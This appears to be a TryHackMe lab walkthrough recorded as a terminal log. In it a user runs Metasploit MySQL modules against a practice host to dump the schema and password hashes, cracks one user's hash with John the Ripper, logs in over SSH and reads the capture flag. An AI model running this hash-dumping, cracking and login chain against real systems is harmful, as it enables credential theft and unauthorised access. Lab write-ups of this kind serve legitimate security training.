## MySQL
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ msfconsole
Metasploit tip: You can pivot connections over sessions started with the
ssh_login modules

 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.4.34-dev                          ]
+ -- --=[ 2461 exploits - 1264 auxiliary - 431 post       ]
+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search mysql_sql

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/admin/mysql/mysql_sql  .                normal  No     MySQL SQL Generic Query


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql

msf6 > use 0
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name  Current Setting   Required  Description
   ----  ---------------   --------  -----------
   SQL   select version()  yes       The SQL to execute.


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   USERNAME                   no        The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.98.84
RHOSTS => 10.10.98.84
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/mysql/mysql_sql) > show options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name  Current Setting   Required  Description
   ----  ---------------   --------  -----------
   SQL   select version()  yes       The SQL to execute.


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  password         no        The password for the specified username
   RHOSTS    10.10.98.84      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   USERNAME  root             no        The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/mysql/mysql_sql) > exploit
[*] Running module against 10.10.98.84

[*] 10.10.98.84:3306 - Sending statement: 'select version()'...
[*] 10.10.98.84:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed

msf6 auxiliary(admin/mysql/mysql_sql) > set SQL "show databases"
SQL => show databases
msf6 auxiliary(admin/mysql/mysql_sql) > exploit
[*] Running module against 10.10.98.84

[*] 10.10.98.84:3306 - Sending statement: 'show databases'...
[*] 10.10.98.84:3306 -  | information_schema |
[*] 10.10.98.84:3306 -  | mysql |
[*] 10.10.98.84:3306 -  | performance_schema |
[*] 10.10.98.84:3306 -  | sys |
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mysql/mysql_sql) > search mysql_schemadump

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_schemadump  .                normal  No     MYSQL Schema Dump


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump

msf6 auxiliary(admin/mysql/mysql_sql) > use 0
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(scanner/mysql/mysql_schemadump) > show options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS 10.10.98.84
RHOSTS => 10.10.98.84
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_schemadump) > exploit

[+] 10.10.98.84:3306 - Schema stored in: /home/yuu/.msf4/loot/20241110224609_default_10.10.98.84_mysql_schema_424227.txt
[+] 10.10.98.84:3306 - MySQL Server Schema
 Host: 10.10.98.84
 Port: 3306
 ====================

---
- DBName: sys
  Tables:
  - TableName: host_summary
    Columns:
    - ColumnName: host
      ColumnType: varchar(60)
    - ColumnName: statements
      ColumnType: decimal(64,0)
    - ColumnName: statement_latency
      ColumnType: text
    - ColumnName: statement_avg_latency
      ColumnType: text
    - ColumnName: table_scans
      ColumnType: decimal(65,0)
    - ColumnName: file_ios
      ColumnType: decimal(64,0)
    - ColumnName: file_io_latency
      ColumnType: text
    - ColumnName: current_connections
      ColumnType: decimal(41,0)
    - ColumnName: total_connections
      ColumnType: decimal(41,0)
    - ColumnName: unique_users
      ColumnType: bigint(21)
    - ColumnName: current_memory
      ColumnType: text
    - ColumnName: total_memory_allocated
      ColumnType: text
...
  - TableName: x$waits_global_by_latency
    Columns:
    - ColumnName: events
      ColumnType: varchar(128)
    - ColumnName: total
      ColumnType: bigint(20) unsigned
    - ColumnName: total_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: avg_latency
      ColumnType: bigint(20) unsigned
    - ColumnName: max_latency
      ColumnType: bigint(20) unsigned

[*] 10.10.98.84:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_schemadump) > search mysql_hashdump

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/mysql/mysql_hashdump  .                normal  No     MYSQL Password Hashdump
   1  auxiliary/analyze/crack_databases       .                normal  No     Password Cracker: Databases
   2    \_ action: hashcat                    .                .       .      Use Hashcat
   3    \_ action: john                       .                .       .      Use John the Ripper


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/analyze/crack_databases
After interacting with a module you can manually set a ACTION with set ACTION 'john'

msf6 auxiliary(scanner/mysql/mysql_schemadump) > use 0
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(scanner/mysql/mysql_hashdump) > show options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     3306             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.98.84
RHOSTS => 10.10.98.84
msf6 auxiliary(scanner/mysql/mysql_hashdump) > exploit

[+] 10.10.98.84:3306 - Saving HashString as Loot: root:
[+] 10.10.98.84:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.98.84:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.98.84:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.98.84:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.98.84:3306 - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.98.84:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_hashdump) > exit

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ nano hash.txt

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cat hash.txt
carl:*EA031893AA21444B170FC2162A56978B8CEECE18

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 ASIMD 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
doggie           (carl)
1g 0:00:00:01 DONE 3/3 (2024-11-10 23:01) 0.9009g/s 2059Kp/s 2059Kc/s 2059KC/s doggie..doggin
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ john hash.txt --show
carl:doggie

1 password hash cracked, 0 left

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ssh carl@10.10.98.84
carl@10.10.98.84's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 10 14:02:52 UTC 2024

  System load:  0.0               Processes:           86
  Usage of /:   41.7% of 9.78GB   Users logged in:     0
  Memory usage: 65%               IP address for eth0: 10.10.98.84
  Swap usage:   0%


23 packages can be updated.
0 updates are security updates.


Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
carl@polomysql:~$ ls -laF
total 44
drwxr-xr-x 5 carl carl 4096 Apr 23  2020 ./
drwxr-xr-x 4 root root 4096 Apr 23  2020 ../
-rw------- 1 carl carl  251 Apr 23  2020 .bash_history
-rw-r--r-- 1 carl carl  220 Apr 23  2020 .bash_logout
-rw-r--r-- 1 carl carl 3771 Apr 23  2020 .bashrc
drwx------ 2 carl carl 4096 Apr 23  2020 .cache/
drwx------ 3 carl carl 4096 Apr 23  2020 .gnupg/
-rw-r--r-- 1 carl carl  807 Apr 23  2020 .profile
drws--S--- 2 carl carl 4096 Apr 23  2020 .ssh/
-rw------- 1 carl carl 1854 Apr 23  2020 .viminfo
-rw-rw-r-- 1 carl carl   44 Apr 23  2020 MySQL.txt
carl@polomysql:~$ cat MySQL.txt
THM{congratulations_you_got_the_mySQL_flag}
```
